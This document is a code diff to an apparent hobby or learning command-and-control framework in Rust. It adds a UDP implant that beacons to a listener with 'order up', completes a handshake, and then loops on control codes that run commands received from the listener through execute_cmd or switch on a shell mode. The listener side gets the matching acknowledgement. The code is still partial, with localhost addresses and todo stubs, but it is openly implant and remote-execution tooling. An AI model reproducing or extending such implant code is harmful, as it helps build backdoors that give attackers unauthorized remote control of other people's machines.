@@ -114,6 +114,7 @@ fn listen_udp(lsn: &mut Listener, address: SocketAddr, sb: &mut Arc<Mutex<Shared
         // replace insides of .contains() with whatever string/key we are using to verify connection
         if bytes != 0 && String::from_utf8_lossy(&buffer[..]).contains("order up") {
             lsn.status = 2;
+            lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to("order recieved".as_bytes(), src);
             // switches to interact mode
             interact_udp(lsn, src, sb);
             lsn.status = 1;
@@ -274,7 +275,11 @@ pub fn execute_cmd(s: String) -> String {
 // main method for implants
 // dispatches to other methods based on network protocol
 pub fn imp_run(protocol: &str, address: SocketAddr) {
-    // TODO
+    match protocol {
+        "udp" => imp_udp(address),
+        "tcp" => imp_tcp(address),
+        &_ => todo!(),
+    }
 }
 
 // main for a udp implant
@@ -286,12 +291,53 @@ fn imp_udp(lsn_addr: SocketAddr) {
     // get public facing IP and pick a port, then initialize socket
     // for sake of demos, stick to localhost
     let address = SocketAddr::from(([127, 0, 0, 1], 2973));
+    // let address = get_system_addr();
     let mut sock = UdpSocket::bind(address).unwrap();
 
     // try to connect back to listener
+    sock.send_to("order up".as_bytes(), lsn_addr);
+    let mut buffer = [0; 2048];
+    let (mut bytes, mut src) = (0, SocketAddr::from(([0, 0, 0, 0], 0)));
+    loop {
+        (bytes, src) = match sock.recv_from(&mut buffer) {
+            Ok((b, s)) => (b, s),
+            Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
+        };
+        if bytes != 0 && String::from_utf8_lossy(&buffer[..]).contains("order recieved") {
+            break;
+        }
+    }
 
+    // once connected, listen for control code in a loop and use a match to determine what to do
+    loop {
+        let mut cc = [0; 1];
+        let (bytes, src) = match sock.recv_from(&mut cc) {
+            Ok((b, s)) => (b, s),
+            Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
+        };
 
-    // once connected, listen for control code
+        let mut shell_mode: bool = false;
+        if bytes != 0 {
+            match cc[0] {
+                // execute single line cmd
+                1 => {
+                    buffer = [0; 2048];
+                    let (bytes, src) = match sock.recv_from(&mut buffer) {
+                        Ok((b, s)) => (b, s),
+                        Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
+                    };
+                    if bytes != 0 {
+                        let cmd_res: String = execute_cmd(String::from_utf8_lossy(&buffer[..]).as_ref().to_string());
+                    }
+                },
+                // begin shell mode
+                2 => shell_mode = true,
+                // stop shell mode
+                69 => shell_mode = false,
+                _u8 => todo!(),
+            }
+        }
+    }
 }
 
 // main for a tcp implant
@@ -312,4 +358,10 @@ pub fn vec_is_zero(buffer: &Vec<u8>) -> bool {
         }
     }
     return true;
+}
+
+// returns a SocketAddr containing the public facing IP of the machine and a random unused port
+pub fn get_system_addr() -> SocketAddr {
+    // replace this with code to find system address
+    return SocketAddr::from(([127, 0, 0, 1], 1337));
 }
